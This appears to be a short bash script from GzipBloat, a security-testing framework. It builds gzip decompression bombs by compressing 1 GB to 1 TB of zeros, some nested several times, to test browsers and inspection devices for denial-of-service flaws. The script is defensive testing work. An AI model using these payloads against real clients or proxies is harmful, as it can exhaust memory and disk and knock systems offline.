#!/bin/bash

#    Copyright (C) 2013  Cyberis Ltd. Author geoff.jones@cyberis.co.uk

#    This file is part of GzipBloat, a PHP framework to test User-Agents 
#    and intermediary content inspection devices for denial-of-service 
#    vulnerabilities with respect to HTTP response decompression.

#    GzipBloat is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    GzipBloat is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.


echo "Making 1G.gzip..."
time dd if=/dev/zero bs=1M count=1024 | gzip > 1G.gzip

echo "Making 10G.gzip..."
time dd if=/dev/zero bs=1M count=10240 | gzip > 10G.gzip

echo "Making 10G.gzipx2..."
time cat 10G.gzip | gzip > 10G.gzipx2

echo "Making 1T.gzip..."
time dd if=/dev/zero bs=1M count=1048576 | gzip > 1T.gzip

echo "Making 1T.gzipx4..."
time cat 1T.gzip | gzip | gzip | gzip > 1T.gzipx4
